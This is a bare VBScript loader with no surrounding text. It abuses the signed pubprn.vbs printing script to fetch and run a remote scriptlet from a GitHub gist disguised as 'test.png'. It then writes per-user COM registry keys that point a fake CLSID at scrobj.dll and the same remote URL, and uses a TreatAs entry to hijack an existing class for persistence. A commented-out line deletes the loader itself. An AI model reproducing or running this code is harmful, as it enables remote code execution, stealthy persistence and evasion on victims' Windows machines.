On Error Resume Next
Set WshShell = WScript.CreateObject("WScript.Shell")
strBaseBrch= "HKCU\Software\Classes\"
WshShell.run "%comspec% /c cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs blah "&chr(34)&"script:https://gist.githubusercontent.com/Elm0D/6d82111d368dee79d8aa143684e2de07/raw/8aea78baf941fb75647b41c0fd92b214e33f91ab/test.png",0
'Add COM values
WshShell.RegWrite strBaseBrch & "Scripting.Dictionary\", "", "REG_SZ"
WshShell.RegWrite strBaseBrch & "Scripting.Dictionary\CLSID\", "{00000001-0000-0000-0000-0000FEEDACDC}", "REG_SZ"
WshShell.RegWrite strBaseBrch & "CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\", "Scripting.Dictionary", "REG_SZ"
WshShell.RegWrite strBaseBrch & "CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32\", "C:\WINDOWS\system32\scrobj.dll", "REG_SZ"
WshShell.RegWrite strBaseBrch & "CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32\ThreadingModel", "Apartment", "REG_SZ"
WshShell.RegWrite strBaseBrch & "CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID\", "Scripting.Dictionary", "REG_SZ"
WshShell.RegWrite strBaseBrch & "CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL\", "https://gist.githubusercontent.com/Elm0D/6d82111d368dee79d8aa143684e2de07/raw/8aea78baf941fb75647b41c0fd92b214e33f91ab/test.png", "REG_SZ"
WshShell.RegWrite strBaseBrch & "CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID\", "Scripting.Dictionary", "REG_SZ"
WshShell.RegWrite strBaseBrch & "CLSID\{3734FF83-6764-44B7-A1B9-55F56183CDB0}\", "", "REG_SZ"
WshShell.RegWrite strBaseBrch & "CLSID\{3734FF83-6764-44B7-A1B9-55F56183CDB0}\TreatAs\", "{00000001-0000-0000-0000-0000FEEDACDC}", "REG_SZ"
'Delete Loader After Add COM values
'WshShell.Run  "cmd.exe /c del " & ChrW(34) & Wscript.scriptfullname & ChrW(34),0,false
